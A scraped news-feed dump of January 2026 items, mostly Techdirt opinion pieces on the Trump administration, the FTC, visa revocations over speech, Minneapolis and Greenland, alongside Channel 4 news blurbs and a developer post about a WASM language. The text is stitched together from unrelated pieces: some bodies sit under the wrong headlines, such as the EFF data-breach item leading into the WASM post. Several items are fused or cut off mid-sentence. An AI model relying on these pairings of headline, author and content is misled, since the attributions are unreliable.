the administration was emboldened and has done it again. This time it’s in service of announcing something more tame, the reintroduction of whole milk into schools. And the administration did so by mocking up an image from beloved farming sim .So, here we have an undoubtedly AI mock-up of an image from , a game I personally adore, with Trump inserted to celebrate this minor thing that RFK Jr.’s crew championed out of Congress. Is whole milk in schools some horrible thing? Look, I only have so much anger to spare, folks, and I’m not killing the budget by spending it on this. But I do have to wonder if developer Concerned Ape will do what Nintendo and Microsoft did not and voice some flavor of objection to the use of its IP by an administration busy doing the fascism elsewhere. While IP enforcement isn’t generally my kink, I sure as shit wouldn’t want  IP associated with Trump. On that, we’ll have to wait and see just how concerned the ape can get, I suppose.But there’s also a nice little shitpost easter egg buried in that image. Take a look at the money counter in the upper right corner of the image.Trump was the 45th President, claims he won the 2020 election and should have been the 46th President, he  the 47th President, and he’s flirted with the idea that he shouldn’t be bound by silly bullshit like our Constitution and should be allowed another term and become the 48th President. 45464748… get it?I do, and it’s frightening rhetoric that is designed to do one of two things. The more innocuous option is that Trump and his cadre of imps enjoys upsetting more than half of the American population by scaring them into thinking he’s going to upend our rule of law and stay in office. It’s cruel. It’s designed purely to cause emotional reactions and “lib tears.” It’s on brand.Or it’s a somewhat subtle nod that he’s not fucking around about that at all and intends to stay in power (again) despite how our system is legally designed to work.Trump is the 45th and 47th president of the United States, and has held onto the debunked claims that he won the presidency against Joe Biden in 2020. He has also publicly said he’s open to a third term, which would be in violation of the 22nd amendment, but Trump doesn’t seem to think the law applies to him. Steve Bannon, the ex-chief-strategist of the Trump administration, has also said that Trump will have a third term, while also reportedly planning to run himself. So these numbers seem to be a thinly veiled threat that Trump wants to be president again in 2028.These people aren’t funny, but they are dangerous. Even if this wasn’t meant to be taken seriously, there is no choice but to do so. Meanwhile, we’ll see if Concerned Ape acts against the use of its IP, as I think it probably should.]]></content:encoded></item><item><title>Canada in the ‘new world order’: leaving the U.S. behind? | About That</title><link>https://www.youtube.com/watch?v=83la3l7_ZGo</link><author>CBC News</author><category>yt</category><enclosure url="https://www.youtube.com/v/83la3l7_ZGo?version=3" length="" type=""/><pubDate>Tue, 20 Jan 2026 22:16:20 +0000</pubDate><source url="https://www.youtube.com/feeds/videos.xml?playlist_id=PLeyJPHbRnGaZeajS8uAtr8cyc19TYBZZ9">About That</source><content:encoded><![CDATA[Prime Minister Mark Carney is diversifying Canada's trade relationships through deals with China and a new partnership with Qatar.

One commissioner is leading the way—when it suits him.The Federal Trade Commission under Lina Khan was not a well-run institution. I wrote about this at the time, often and at length, and I regret nothing. But wow—wow—would you be forgiven for thinking that the goal of new management is to make Khan’s tenure look good by comparison. There is plenty to say about this sorry state of affairs, but for now let’s focus on a single commissioner.Why just one? Isn’t the FTC a multi-member body? Well, these days the agency is something of a husk. President Trump has purported to fire two commissioners—the Democrats, naturally. The FTC Act says he cannot do that, but the Supreme Court appears poised to bless the move on constitutional grounds (a serious mistake). A third commissioner, Melissa Holyoak, recently departed after a brief stint. And rumors swirl that the chair, Andrew Ferguson, will soon take on a second job overseeing a nationwide fraud unit at the Justice Department.That leaves Mark Meador. He may soon be the lone commissioner who has not been defenestrated, jumped ship, or been pulled into a dual role.Last week I saw Meador speak at an antitrust conference in the Bay Area. As a matter of policy, his remarks were not to my taste. He aired a familiar set of complaints about modern tech products. Apple’s “liquid glass” is confusing; Google’s AI overviews—that stuff that now appears above the search results—are annoying; AI-generated cat videos, and short-form video more generally, are bad for the soul. It is certainly true that tech companies have many bad ideas. It does not follow that Mark Meador knows better. Yet he spoke with complete confidence in his own superior vision for the tech industry. He knows what the social media market should look like. He knows how to “win the AI race .” The man is, apparently, a prophet.Some of Meador’s gripes were not really about products at all, but about people. People  short-form video. The government, Meador seemed to suggest, must protect them from themselves. You might say that Meador wants to replace the consumer-welfare standard, under which the FTC protects markets that work to give people what they want, with a moral-welfare standard, under which the FTC pushes markets to give people what they are to want—as determined by Mark Meador.Maybe people should be more virtuous. But what business is that of the FTC? The FTC Act makes commissioners competition regulators, not philosopher-kings or morality police.One European lawyer I spoke with at the conference seemed rather taken with Meador’s speech. He wants to crack down on Big Tech, after all; what’s not to like? I tried to explain how Meador plainly judges companies by a moral code, and why that code should give any upstanding European pause. Meador is committed to “the just ordering of society that best facilitates human flourishing.” He speaks unabashedly of the need for “beauty and virtue,” “moral values,” and “tradition and custom.” He peppers his writing (yes, his  writing) with theological language, referring to human beings as “embodied souls seeking communion with their fellow man and their Creator.” The undertone—the dog whistle, if you will—is not Brussels-style social democracy. It is national conservatism, if not flat out Christian nationalism.Which brings me to my real objection to Meador’s appearance. In Palo Alto, he was mild, reasonable, even conciliatory. The speech itself was a little misguided but pleasant enough. The problem was what it concealed: the other Mark Meador, and the other FTC.In his speech, Meador called for apolitical enforcement. Antitrust, he said, should not serve an “unrelated political agenda.” It should not target disfavored industries. He and the agency should not “make decisions according to how political winds are blowing.”How rich. Maximally politicized enforcement has characterized the Trump administration at large, and the Trump FTC in particular. Consider the Omnicom–IPG settlement. The FTC allowed two major advertising firms to merge, but only after restricting the new entity’s ability to withhold advertising dollars based on a publisher’s viewpoints. The settlement is a transparent assault on advertising firms’ First Amendment right to boycott publishers on grounds of social or ideological principle. It is also a nakedly political effort to redirect advertising dollars toward right-wing outlets.Or consider the FTC’s hapless social-media “censorship” inquiry. This move, too, is an attack on First Amendment rights—this time, platforms’ right to moderate content as they see fit. And this move, too, is aimed at helping the right, specifically those right-wing speakers who insist—baselessly, by and large—that platforms have “silenced” them. Take also the FTC’s foray into debates over gender medicine. The FTC is not a medical regulator; it has no expertise in this area. But transgender issues are at the center of the culture war, so the agency could not resist weighing in, thumb firmly on the scale for the political right.For Meador to sit in Palo Alto and sermonize about ignoring political winds was an insult to anyone paying attention to his agency or the administration it serves.Equally striking was the contrast between Meador’s tone inside the conference room and the tone he and the FTC adopt elsewhere. In his remarks, Meador urged listeners not to “draw up battle lines.” Washington and Silicon Valley, he said, should root for each other’s success. During the Q&A, he endorsed a “just the facts, ma’am” approach. He expressed distaste for heated rhetoric from private parties—inflated claims about the stakes of litigation or boasts about whipping the FTC in court. Such talk amounts, he complained, to “melodramatic atmospherics.”But Mark Meador and the Trump FTC do melodramatic atmospherics with the best of them. Last year, for instance, the FTC convened a conference titled “The Attention Economy: How Big Tech Firms Exploit Children and Hurt Families.” The title was all too fitting: the whole event was slanted, overheated, and self-righteous. Meador led the charge. He likened “the battle over the ‘attention economy’” to “the fight against Big Tobacco.” He argued that social media companies sell an addictive and harmful product; that they must keep children hooked, “craving the next fix, the next puff, the next notification”; and that they peddle lies in their defense.No doubt this jeremiad resonates with some. I think it’s nonsense. But the point here is not whether Meador is right or wrong. It’s that he is two-faced. In Silicon Valley, he presents himself as mildly uneasy about short-form video. Elsewhere, he portrays social media companies as irredeemable reprobates, scarcely distinguishable from cigarette manufacturers. The Meador we saw projected reasonableness. In reality, he is a fanatic.What Meador concealed about himself pales, though, beside what he concealed about the FTC. Excuse me, commissioner, did you just say you oppose overheated rhetoric? Where were you after the FTC lost its antitrust case against Meta?The defeat was not surprising. The case was weak from the outset, failing to grapple with competitors such as YouTube and TikTok. It was dismissed in a careful opinion written by an able judge. That judge, James Boasberg, also ruled against the Trump administration’s reprehensible efforts to hustle men, without due process, to a prison in El Salvador. In response to that ruling, some GOP lawmakers launched a campaign to impeach him. The case for impeachment is risible. But that did not stop the FTC from exploiting it. After the Meta loss, an FTC spokesperson, Joe Simonson, sneered: “The deck was always stacked against us with Judge Boasberg, who is currently facing articles of impeachment.”This statement is an embarrassment. Everyone at the FTC should be mortified by it. But there it is. Mark Meador has no standing to lecture others about decorum.Nor should we expect this to be an isolated lapse. The second Trump FTC has been staffed with people who are terminally online. In a sense, they are the dog that caught the car: they have memed their way into an amount of power they are neither competent nor responsible enough to wield.This became obvious when the FTC set out to punish Media Matters. The organization had published a study finding that ads appeared next to hate speech on the alt-right-friendly platform X. The agency then launched a sweeping investigation (another example, contra Meador, of the FTC’s overtly political posture). The courts blocked the probe, finding it to be retaliation for constitutionally protected speech. Evidence of a retaliatory motive included, almost comically, some FTC staffers’ big fat mouths. Before joining the agency, a cadre of young edgelords had been spending their time spouting off on social media. Joe Simonson (he of the appalling comment after the Meta loss) had mocked Media Matters for employing “a number of stupid and resentful Democrats.” Another staffer had called the group “scum of the earth.”This is the backdrop to Meador’s calls, in Palo Alto, to lower the temperature. Spare us, commissioner.The word at the conference was that the FTC is in disarray. Many experienced attorneys and economists accepted one of the Trump administration’s buyout offers. Others concluded, after a return-to-office mandate, that if working for the FTC was going to be a hassle—don’t forget those “five things you did this week” emails!—they might as well leave for higher pay. I heard this from a former government official who had himself recently decamped to private practice. When I asked this refugee about the FTC’s ambitions to police social media or wade into gender medicine, he said he would not be surprised if the agency ultimately accomplishes very little. Who knows. But the intuition is sound: you cannot decimate and demoralize an agency and then expect it to move regulatory mountains.When Meador was appointed, Tyler Cowen summed things up nicely, concluding that he “is just flat out terrible,” including for his inability to maintain “a basic level of professionalism.” Is he lonely at the top? With the agency hollowed out, Meador may be a king without a throne. One can only hope that his capacity for mischief will be constrained by the wreckage below.Corbin K.

The Emmy Award-winning documentary “The Luanda Leaks” — part of a worldwide investigation with the International Consortium of Investigative Journalists that drew on a trove of more than 700,000 leaked documents — revealed how Isabel dos Santos made hundreds of millions of dollars thanks in part to her father’s longtime control of Angola’s government.

Despite a history of favorable deals with the Angolan government, dos Santos said she made her fortune on her own merit — and that corruption charges that were levied against her were part of a politically motivated “witch hunt.”

As part of the ICIJ’s reporting, 120 journalists from 36 media organizations in 20 countries spent months examining and verifying dos Santos’ leaked financial and business records, and revealed a paper trail of how she benefited from her position — and how big-name American accounting and consulting firms helped make it possible.

We cannot do what we do without your support.Poland is set to become the world’s tenth biggest holder of gold after its central bank, the National Bank of Poland (NBP), announced plans to increase its reserves to 700 tonnes.The NBP currently holds 550 tonnes of gold, the 12th largest reserve among the world’s central banks. However, increasing that to 700 tonnes would, on current figures, move it ahead of the Netherlands (612.5 tonnes) and Turkey (641.3 tonnes).“This will place Poland among the elite ten countries with the largest gold reserves in the world,” declared NBP governor Adam Glapiński in a press release on Tuesday announcing the plan to increase reserves to 700 tonnes.Poland has been accelerating its gold accumulation in recent years. In 1996, the NBP held just 14 tonnes of gold. By 2016, the year Glapiński became the bank’s governor, that had risen to 102 tonnes. In the decade since then, the figure has grown more than fivefold.According to data from the World Gold Council, an international trade association for the gold industry, in the first 11 months of last year, the NBP added more gold to its reserves (95 tonnes) than any other central bank globally.In May last year, NBP announced that for the first time its gold reserves were larger than those of the European Central Bank (ECB).Last week, Glapiński had already signalled plans to increase the NBP’s gold reserves. He emphasised that gold is a strategic asset for the state’s security and said that selling it is “absolutely out of the question”, reported broadcaster TVN24.Glapiński also warned that the rapid rise in gold prices will not last indefinitely and that a significant correction is possible. Regardless, he said, the central bank will continue accumulating reserves to ensure the country’s financial security in “exceptionally volatile times.”According to Glapiński, the 550 tonnes of gold currently held by the bank are worth nearly 276 billion zloty (€65.3 billion). That meant that the metal accounted for around 28% of the value of the NBP’s total reserves at the end of 2025.

Very pro-free-expression. One tiny problem: the very same day, a federal judge refused to dismiss a lawsuit against Secretary of State Marco Rubio over the US government doing… essentially the same thing. Hat tip to the excellent Chris Geidner from Lawdork for calling out the contrast on Bluesky.The lawsuit, brought by Stanford Daily Publishing Corporation along with two anonymous noncitizen students, challenges the government’s practice of revoking visas and initiating deportation proceedings against people lawfully present in the United States based on their speech—including, notably, their social media activity. As we’ve covered here at Techdirt, the State Department has made reviewing social media profiles a regular part of the visa process, and has been actively targeting people for their online expression.The court’s ruling lays out in pretty damning detail just how aggressively the government has been going after people for their protected speech. From the order:In March 2025, DHS and ICE began aggressively targeting lawfully present noncitizens for protected speech, particularly at universities. Plaintiffs point to the arrests of Mahmoud Khalil, Rümeysa Öztürk, and Mohsen Mahdawi as emblematic of the Government’s enforcement strategy.And what exactly did these individuals do that warranted arrest, detention, and deportation proceedings? Let’s see:Ms. Öztürk is a PhD student at Tufts University who is lawfully present in the United States on an F-1 student visa. Ms. Öztürk co-authored an opinion article in the Tufts student newspaper that criticized the university’s refusal to adopt several resolutions approved by the undergraduate student senate urging the University to, among other things, recognize a genocide in Gaza and divest from Israeli companies… On March 25, 2025, six plain-clothes federal officers surrounded Ms. Öztürk on the street outside her home, detained her, and transported her to a Louisiana immigration jail.She wrote an op-ed in a student newspaper. A DHS spokesperson claimed her editorial “glorified and supported terrorists.” It did not. It criticized the university’s policies, and did nothing to glorify or support “terrorists.”The court also details what government officials have been saying publicly about this enforcement strategy.DHS posted on Twitter that anyone who thinks they can “hide behind the First Amendment to advocate for anti-American and anti-Semitic violence and terrorism—think again.” Stephen Miller bragged that “The State Department has revoked tens of thousands of visas, and they’re just getting started on tens of thousands more.” The US government isn’t hiding the fact that they’re combing US social media to figure out who to detain.One of the plaintiffs—Jane Doe—is on the Canary Mission website, a private list of people which MAGA folks claim are anti-Israel and which the government has apparently been using as a shopping list for who to kidnap and deport. From the ruling:Jane Doe was listed on the Canary Mission website, which is an anonymously and privately run website that publishes personal information of individuals and organizations that the Canary Mission personally deems “anti-Israel.” In their motion and during the hearing, the Government explained that DHS had asked ICE to generate “reports” for the State Department on individuals listed on the Canary Mission website to aid in decision-making about visa revocations. Notably, before the Government brought enforcement actions against them, Mahmoud Khalil, Rümeysa Öztürk, and Mohsen Mahdawi all had profiles published about them on the Canary Mission website.The US government is actively monitoring people’s social media, revoking visas over protected speech, and using an anonymous website that doxxes pro-Palestinian activists as a source for enforcement targets.And then the State Department has the audacity to criticize Nicaragua for “detaining Nicaraguans for liking posts online.”Remember, the State Department’s tweet said that this kind of behavior shows “how paranoid and illegitimate” the regime is. We agree.The hypocrisy is coming so fast it’s hard to keep up, but this one deserves special mention because the State Department is literally condemning other countries for the exact policy it’s implementing, and getting called out about it in court.Nicaragua is paranoid and illegitimate for targeting social media activity, but when the US does it, we’re… protecting national security? Fighting antisemitism? The framing changes but the underlying action is the same: using the power of the state to punish people for their online expression.The court, for its part, found that the plaintiffs’ fears of enforcement were entirely reasonable given the government’s very public campaign of targeting people for their speech:Jane Doe and John Doe have sufficiently alleged that their behavior falls into the crosshairs of the Government’s stated enforcement priorities. The Government has also not disavowed plans to continue invoking the Revocation and Deportation Provisions.In other words: the government isn’t even pretending it won’t keep doing this. And yet somehow it’s Nicaragua that needs to be lectured about freedom?Maybe someone at the Bureau of Western Hemisphere Affairs should walk down the hall and have a chat with their colleagues about what “freedom means ending the regime’s cycle of repression” actually looks like in practice. Because right now, the State Department’s position appears to be: targeting people for their social media activity is evidence of a paranoid, illegitimate regime—unless we’re the ones doing it.]]></content:encoded></item><item><title>Spain train crash: Death toll rises as search for bodies continues</title><link>https://www.channel4.com/news/spain-train-crash-death-toll-rises-as-search-for-bodies-continues</link><author>Clare Fallon</author><category>news</category><pubDate>Tue, 20 Jan 2026 19:50:04 +0000</pubDate><source url="https://www.channel4.com/news">Channel 4</source><content:encoded><![CDATA[Rescuers in southern Spain are still searching for bodies in the wreckage of Sunday’s deadly train crash.The death toll has risen to at least 41 after cranes and heavy machinery were used to lift a damaged carriage from one of the trains, which had plunged down an embankment.Spain’s King and Queen visited the scene of the accident as the country began three days of mourning.]]></content:encoded></item><item><title>‘Trump is a real threat to world peace’ – Former Nato chief</title><link>https://www.channel4.com/news/trump-is-a-real-threat-to-world-peace-former-nato-chief</link><author>Cathy Newman</author><category>news</category><pubDate>Tue, 20 Jan 2026 19:42:20 +0000</pubDate><source url="https://www.channel4.com/news">Channel 4</source><content:encoded><![CDATA[Former Nato Secretary General and ex-Danish Prime Minister Anders Fogh Rasmussen has delivered a stark warning over Donald Trump’s threats towards Greenland, saying an attack on the Danish territory would spell the end of Nato and fundamentally undermine the Western alliance.Speaking to Channel 4 News, Rasmussen has dismissed claims that Denmark has failed to defend Greenland, arguing that the United States already has the right to deploy troops and bases there under a long-standing defence agreement – one it has chosen not to fully use.  He warns that Trump’s rhetoric risks eroding]]></content:encoded></item><item><title>Davos: World leaders faced with ‘tough moment in geopolitics’</title><link>https://www.channel4.com/news/davos-world-leaders-faced-with-tough-moment-in-geopolitics</link><author>Paul McNamara</author><category>news</category><pubDate>Tue, 20 Jan 2026 19:42:10 +0000</pubDate><source url="https://www.channel4.com/news">Channel 4</source><content:encoded><![CDATA[Senior Political Correspondent Paul McNamara reports from the World Economic Forum in Davos, Switzerland.Camera/Editor: Jason Farrington]]></content:encoded></item><item><title>Will European diplomats change their tone with Trump?</title><link>https://www.channel4.com/news/will-european-diplomats-change-their-tone-with-trump</link><author>Anushka Asthana</author><category>news</category><pubDate>Tue, 20 Jan 2026 19:41:12 +0000</pubDate><source url="https://www.channel4.com/news">Channel 4</source><content:encoded><![CDATA[US Editor Anushka Asthana reports outside the White House.]]></content:encoded></item><item><title>Trump’s reversal on Chagos Islands deal surprises UK government</title><link>https://www.channel4.com/news/trumps-reversal-on-chagos-island-deal-surprises-uk-government</link><author>Gary Gibbon</author><category>news</category><pubDate>Tue, 20 Jan 2026 19:40:14 +0000</pubDate><source url="https://www.channel4.com/news">Channel 4</source><content:encoded><![CDATA[Political Editor Gary Gibbon reports outside Westminster.]]></content:encoded></item><item><title>European leaders hit back at Trump over Greenland and tariffs</title><link>https://www.channel4.com/news/european-leaders-hit-back-at-trump-over-greenland-and-tariffs</link><author>Gary Gibbon</author><category>news</category><pubDate>Tue, 20 Jan 2026 19:39:23 +0000</pubDate><source url="https://www.channel4.com/news">Channel 4</source><content:encoded><![CDATA[European leaders are hitting back at President Donald Trump during speeches at the World Economic Forum in Davos.The French president warned of a “shift towards a world without rules”, while Belgium’s prime minister said the time for appeasement is over.One person not in Davos is UK Prime Minister Keir Starmer, who found himself under fire for his Chagos deal which President Trump blasted as “an act of great stupidity”.Producer: Robert Hamilton]]></content:encoded></item><item><title>💾 The Worst Data Breaches of 2025—And What You Can Do | EFFector 38.1</title><link>https://www.eff.org/deeplinks/2026/01/worst-data-breaches-2025-and-what-you-can-do-effector-381</link><author>Christian Romero</author><category>tech</category><enclosure url="https://www.eff.org/files/banner_library/effector_banner_5.jpeg" length="" type=""/><pubDate>Tue, 20 Jan 2026 19:14:19 +0000</pubDate><source url="https://www.eff.org/rss/updates.xml">Deeplinks</source><content:encoded><![CDATA[Prefer to listen in?

I don't need full POSIX emulation or a massive standard library just to render some stuff to a canvas and handle basic UI.The main thing I wanted to solve was the JS/WASM interop bottleneck. Instead of using the standard glue code for every call, I moved everything to a Shared Memory architecture using Command and Event buffers.The way it works is that I batch all the instructions in WASM and then just send a single "flush" signal to JS. The JS side then reads everything directly out of Shared Memory in one go. It’s way more efficient, I ran a benchmark rendering 10k rectangles on a canvas and the difference was huge: Emscripten hit around 40 FPS, while my setup hit 100 FPS.But writing DOM logic in C++ is painful, so I built Coi. It’s a component-based language that statically analyzes changes at compile-time to enable O(1) reactivity. Unlike traditional frameworks, there is no Virtual DOM overhead; the compiler maps state changes directly to specific handles in the command buffer.I recently benchmarked this against React and Vue on a 1,000-row table: Coi came out on top for row creation, row updating and element swapping because it avoids the "diffing" step entirely and minimizes bridge crossings. Its bundle size was also the smallest of the three.One of the coolest things about the architecture is how the standard library works. If I want to support a new browser API (like Web Audio or a new Canvas feature), I just add the definition to my WebCC schema file. When I recompile the Coi compiler, the language automatically gains a new standard library function to access that API. There is zero manual wrapping involved.I'm really proud of how it's coming along. It combines the performance of a custom WASM stack with a syntax that actually feels good to write (for me atleast :P). Plus, since the intermediate step is C++, I’m looking into making it work on the server side too, which would allow for sharing components across the whole stack.component Counter(string label, mut int& value) {    def add(int i) : void {
        value += i;

You absolute idiots. Whatever kills us makes us stronger. And I say that as only a part-time Minnesotan. I’ve split time between there and South Dakota over the past couple of decades. And Minneapolis never fails to impress.The administration went all in on Minneapolis after a MAGA grifter claimed a bunch of fraud was being perpetrated by Somali-Americans. Trump, of course, believed this because he hates Minnesota, Somalis, Ilhan Omar, and anything else that looks like it might be a grassroots reaction to his Ministry of Hate. The Pentagon has ordered 1,500 US troops based in Alaska to prepare to deploy to Minnesota as a precautionary measure in case the administration decides to send them, a US official said, speaking on condition of anonymity. The unit of the 11th Airborne Division is a cold-weather unit nicknamed “The Arctic Angels.”Hey, good luck with that. Local businesses are far less willing to feed and house federal officers, given the risk it poses to their own businesses once the locals discover where ICE is shacking up and/or getting its coffee. While DHS officials love to claim any refusal to house federal officers is unamerican af, the reality is that local business owners don’t want the negative publicity and negative public action housing ICE officers might provoke.You’d think a shrewd businessperson such as Donald Trump would understand. After all, he’s made a career out of strategic bankruptcies and investing in gold leaf futures. He should sympathize with small business owners who don’t want to be whistled/ice-cubed/TripAdvisored into non-existence. But he doesn’t because he only cares about Trump and thinks everyone should be asking “Where’s Trump?” whenever he fails to post to his own social media service 5-10 times a day.“Arctic Angels” my Midwestern white ass. These won’t be angels. They’ll be on the wrong side of history for as long as history persists, which tends to be forever. (Just ask the Roman Empire figures you idolize, you stupid white nationalist fucks.)It’s not just the Army that might be coming for Minneapolis, the home of Minnesota Nice and interpretations of cold weather that defy scientific measurement. You may have trained in Alaska, but have you ever been whistled into submission by people who know how to walk on ice without falling flat on their ass?I submit to you that you are not ready to deal with Minnesota. No one is. The administration is still flustered by Portland, Oregon, where inflatable animal costumes have beaten ICE into semi-submission.Bringing in the FBI isn’t going to change anything, especially when it’s still headed by an insurrection enabler that has been elevated to a level of infamy even his worst enemies would only hesitantly wish on him:At the same time, the FBI is sending messages to its agents nationwide seeking volunteers to temporarily transfer to Minneapolis. It wasn’t immediately clear what the FBI would ask agents who volunteered to travel to Minneapolis to do.The FBI already has a pretty big building in Minneapolis. Yep, that’s all theirs and I know because last December, I spent three days in the hotel facing it while visiting my family. Bringing in more FBI agents may fill those officers a bit more, but it won’t make Minneapolis any less of the FOAD monster it has morphed into in response to a vengeful federal invasion. Tim Walz, the governor of Minnesota, has pledged to send out National Guard troops to protect Minnesotans and their rights. The federal government, on the other hand, has only promised to send out more guys with guns to protect the “We have to send more officers and agents just to protect our officers to carry out their mission,” ICE Director Todd Lyons said on Fox News’ Sunday Morning Futures. “The majority of those are there to protect the men and women who are already there. Now we need 10-15 officers per arrest to protect each other” against protesters.If you cowards can’t arrest someone when faced with the combined forces of whistles and GTFO shouts without assembling half a platoon, you’re definitely in the wrong business. If you think sending more officers and actual military troops will keep Minneapolis residents from making it hard for you to be as racist as you want to be… well, just look at the response you provoked after murdering someone just because she made it clear she wasn’t intimidated by you. Trump wants a war. But he’s not smart enough to choose his battles. Unless he’s got the willpower to push past the few guardrails keeping him in check, he’s going to be America’s next Custer — a man so secure in his white-makes-right philosophy that he won’t recognize that he’s in over his head until it’s far too late. And the analogy fits: they’re both prime examples of the “meritocracy” a bunch of lesser failures claim makes this country great. On one hand, we have a thrice-divorced “deal maker” who’s more famous for his bankruptcies than his business successes. On the other hand, we have Custer, who’s absolutely the mold they cast MAGA from: Not only last in his class, but last in his class of only . Most West Point classes exceeded 100 cadets, but with the Civil War an ongoing concern, many of Custer’s betters had already volunteered to serve, rather than (lol) compete with Custer for the worst grades. Bring it on, losers. The Midwest will fuck you up in ways you New York elites (yes, that’s , Trump) can’t even imagine.]]></content:encoded></item><item><title>Is Europe going to stand up to Trump over Greenland – Peter Zeihan</title><link>https://www.channel4.com/news/is-europe-going-to-stand-up-to-trump-over-greenland-peter-zeihan</link><author>Jackie Long</author><category>news</category><pubDate>Tue, 20 Jan 2026 18:45:41 +0000</pubDate><source url="https://www.channel4.com/news">Channel 4</source><content:encoded><![CDATA[As Donald Trump marks a year back in office, his threats against Europe and hard-line trade policies are pushing his allies to the edge – while China and Russia, once considered America’s enemies, watch on with apparent glee.And if the UK once thought flattery was the best form of defence, the president has put paid to that with potentially crushing tariffs and a swipe at Keir Starmer’s Chagos Islands deal – an agreement he had supposedly signed off on.So how do we make sense of a global future in flux?On this episode of The Fourcast, Jackie Long was joined by geopolitical strategist Peter Zeihan.]]></content:encoded></item><item><title>Daily Deal: Linux/UNIX Certification Training Bundle</title><link>https://www.techdirt.com/2026/01/20/daily-deal-linux-unix-certification-training-bundle-4/</link><author>Daily Deal</author><category>tech</category><pubDate>Tue, 20 Jan 2026 18:44:00 +0000</pubDate><source url="https://www.techdirt.com/">Techdirt</source><content:encoded><![CDATA[Linux and UNIX operating systems have become increasingly popular in commercial computing environments.

The presentation demonstrates why CPUs often outperform GPUs for memory-intensive AI workloads, offering superior cost-effectiveness and immediate availability without architectural complexity.// BioWilder Lopes is a second-time founder, developer, and research engineer focused on building practical infrastructure for developers. He is currently building Ogre.run, an AI agent designed to solve code reproducibility.Ogre enables developers to package source code into fully reproducible environments in seconds. Unlike traditional tools that require extensive manual setup, Ogre uses AI to analyze codebases and automatically generate the artifacts needed to make code run reliably on any machine. The result is faster development workflows and applications that work out of the box, anywhere.// Related LinksWebsite: https://ogre.runhttps://lopes.aihttps://substack.com/@wilderlopeshttps://youtu.be/YCWkUub5x8c?si=7RPKqRhu0Uf9LTql]]></content:encoded></item><item><title>Joe Rogan Experience #2441 - Paul Rosolie</title><link>https://www.youtube.com/watch?v=EoFniMSMj08</link><author>PowerfulJRE</author><category>podcast</category><enclosure url="https://www.youtube.com/v/EoFniMSMj08?version=3" length="" type=""/><pubDate>Tue, 20 Jan 2026 18:00:17 +0000</pubDate><source url="https://www.youtube.com/channel/UCzQUP1qoWDoEbmsQxvdjxgQ">Podcast - Joe Rogan</source><content:encoded><![CDATA[Paul Rosolie is a conservationist, filmmaker, author, and founder of Junglekeepers.

Why Won’t Congress Stop It?</title><link>https://www.techdirt.com/2026/01/20/everyone-knows-our-mad-kings-greenland-obsession-is-insane-why-wont-congress-stop-it/</link><author>Mike Masnick</author><category>tech</category><pubDate>Tue, 20 Jan 2026 17:30:46 +0000</pubDate><source url="https://www.techdirt.com/">Techdirt</source><content:encoded><![CDATA[Look, I know we’ve all gotten somewhat numb to the constant stream of unhinged pronouncements from the White House. At some point, the brain develops defense mechanisms. But every now and then, something comes along that is so transparently, obviously, undeniably insane that it demands we stop and actually process what is happening.This weekend was one of those moments.President Trump sent a text message to Norway’s Prime Minister Jonas Gahr Støre that was subsequently leaked to PBS and reported on by the New York Times. And I genuinely need you to read this, because summarizing it doesn’t do justice to how absolutely deranged it is:Dear Jonas: Considering your Country decided not to give me the Nobel Peace Prize for having stopped 8 Wars PLUS, I no longer feel an obligation to think purely of Peace, although it will always be predominant, but can now think about what is good and proper for the United States of America. Denmark cannot protect that land from Russia or China, and why do they have a ‘right of ownership’ anyway? There are no written documents, it’s only that a boat landed there hundreds of years ago, but we had boats landing there, also. I have done more for NATO than any other person since its founding, and now, NATO should do something for the United States. The World is not secure unless we have Complete and Total Control of Greenland. Thank you! President DJTLet me be absolutely clear about what you just read: The President of the United States is explicitly stating that because he didn’t receive an award he wanted, he “no longer feel[s] an obligation to think purely of Peace” and is therefore justified in threatening to forcibly take territory from a NATO ally.This is the stated reasoning. From the President. In writing. To a foreign head of state.And this only came after Trump first announced illegal and unnecessary tariffs on products from Europe for not just handing him Greenland (which is actually a tax on Americans, since that’s who pays the tariffs). Støre’s initial text message to Trump was an attempt to get him to calm down and to stop doing ridiculously antagonistic shit like taxing Americans because foreign countries won’t just hand Trump an entire territory he’s unhealthily obsessed with.I want to focus on a few layers of insanity here, because they compound on each other in ways that should be making every American deeply uncomfortable.First: Trump is yelling at the wrong country about the wrong thing.The Nobel Peace Prize is not awarded by the Norwegian government. It is awarded by an independent five-member committee chosen by Norway’s parliament. Prime Minister Støre had to patiently explain this (again) in response:As regards the Nobel Peace Prize, I have on several occasions clearly explained to Trump what is well known, namely that it is an independent Nobel Committee, and not the Norwegian government, that awards the prizeThis is not obscure information. This is how the Nobel Prize has worked since 1901. The fact that the President either doesn’t know this or doesn’t care is already disqualifying. But we’re just getting started.Also, Greenland is a territory of Denmark. Denmark, notably, is not Norway. Norway is not Denmark. Greenland is not controlled by Norway, just like Norway’s government doesn’t determine who gets the Nobel Peace Prize and… why are we even talking about this?Second: He’s openly admitting his Greenland obsession has nothing to do with national security.For months, the official line has been that acquiring Greenland is somehow essential for American national security. But here’s Trump, in his own words, saying the quiet part extremely loud: the real reason is that his feelings got hurt over a prize. The “national security” framing was always pretextual nonsense, and now we have the President himself confirming it. Beyond the fact that the threat to take Greenland has, itself, done a tremendous amount of damage to US national security, Trump’s linking it to the prize undermines every other claim.If Greenland were actually critical to American security interests, the Nobel Committee’s decisions would be completely irrelevant. The fact that Trump is explicitly linking the two reveals the entire enterprise as what it always was: the wounded ego of a man who desperately wants validation and will threaten sovereign nations to get it.Third: “There are no written documents” is weapons-grade historical illiteracy.Denmark’s connection to Greenland stretches back over 300 years. There are, in fact, extensive written documents, including treaties that the United States itself has signed recognizing Danish sovereignty over Greenland. A 2004 defense pact between the U.S. and Denmark—which already grants the US tremendous rights to make use of Greenland for the US military—explicitly recognizes Greenland as “an equal part of the Kingdom of Denmark.” In 1916, when Denmark sold what are now the U.S. Virgin Islands to the United States, the treaty included an explicit clause where the U.S. agreed not to object to Danish interests in Greenland.But sure, “there are no written documents” and “boats landing” is apparently the level of historical analysis we’re working with now. (We won’t even get into the question of what it means for the United States that “boats landing here hundreds of years ago” gives you no rights to the land).Fourth: He’s threatening to invade a country because he didn’t get a Peace Prize.Like, what the fuck are we even doing here?Also, no, he didn’t stop “8 wars PLUS.” Stop letting him get away with lying about this. He’s taking credit for a ton of other things that weren’t wars, that aren’t over, or that he had nothing to do with.Fifth: This is 25th Amendment territory, and everyone knows it.The 25th Amendment exists precisely for situations where a President is “unable to discharge the powers and duties of his office.” When the President openly states that his bellicose foreign policy is being driven by a grudge over not receiving a peace prize—and that this grudge means he no longer feels obligated to pursue peace—we are describing someone whose judgment is fundamentally compromised.As the Daily Beast put it:It is clearly not rational to start a war because your feelings got 